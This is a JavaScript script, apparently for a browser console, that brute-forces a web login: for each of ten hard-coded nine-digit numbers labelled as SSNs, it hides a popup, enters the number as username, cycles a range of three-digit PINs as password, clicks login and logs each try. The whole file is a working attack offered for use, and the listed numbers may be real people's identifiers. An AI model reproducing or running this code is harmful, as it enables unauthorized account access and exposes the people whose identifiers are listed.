const sleep_account = 1050
const count_start = 930
const count_end = 999
async function generateNumber(ssn) {
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    let list_charate = '0123456789'
    let ping = null
    let account = 0
    for (let char1 in list_charate) {

        for (let char2 in list_charate) {
            for (let char3 in list_charate) {
                account = account + 1
                ping = '' + char1 + char2 + char3;

                if (account > count_start && account < count_end) {

                    document.getElementById("mpe_backgroundElement").style.display = 'none'
                    document.getElementById("MainContent_pnlPopup").style.display = 'none'
                    document.getElementById("MainContent_txtUserName").value = ssn
                    document.getElementById("MainContent_txtUserPass").value = ping
                    document.getElementById("MainContent_chkLogin").checked = true
                    document.getElementById("MainContent_btnLogin").click()
                    console.log("Ping " + ping + " N" + account)
                    console.log(`SSN: ${ssn} PING: ${ping} ACCOUNT ${account}`)
                    document.getElementById("MainContent_pnlPopup").style.display
                    await sleep(sleep_account);


                }
            }
        }
    }
}


async function listGenerate(list_ssn) {
    for (let item of list_ssn) {
        await generateNumber(item)
    }
}
listGenerate([
    583579958,
    580762511,
    580824419,
    582429356,
    581854645,
    582172228,
    580233512,
    580484293,
    582548892,
    581175942
])